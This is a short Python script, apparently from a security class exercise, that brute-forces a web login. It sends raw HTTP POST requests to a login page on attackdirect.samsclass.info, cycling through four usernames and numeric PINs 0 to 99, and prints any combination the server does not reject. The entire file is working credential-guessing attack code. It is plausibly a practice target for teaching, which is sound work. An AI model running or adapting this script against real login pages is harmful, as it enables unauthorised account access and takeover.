import socket
import getpass
import time
socket.setdefaulttimeout(1)
#
#target = raw_input('Target host (like ww.ccsf.edu): ')
#tport = 80
#
#s.connect((target, tport))
#s.send('HEAD / HTTP/1.1\nHost: ' + target + '\n\n')
#print s.recv(1024)
#s.close()
req = """POST /python/login2.php HTTP/1.1
Host: attackdirect.samsclass.info
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Content-Type: application/x-www-form-urlencoded
Content-Length: %d
Cookie: __cfduid=db01d2e65532b229489e7bd01f3097bcc1528746415
Connection: keep-alive
Upgrade-Insecure-Requests: 1

u=%s&p=%s"""


for user in ['bil', 'ted', 'sally', 'sue']:
    for pin in range(100):
        s = socket.socket()
        pw = "%d"%pin
        print(user, pw)
        req1 = req%(len(user)+len(pw)+5, user, pw)
        s.connect(('attackdirect.samsclass.info', 80))
        s.send(req1)
        out = s.recv(1024)
        if out.find('rejected') < 0:
            print user, pw
            print out
        print 'socket closed'
        s.close()
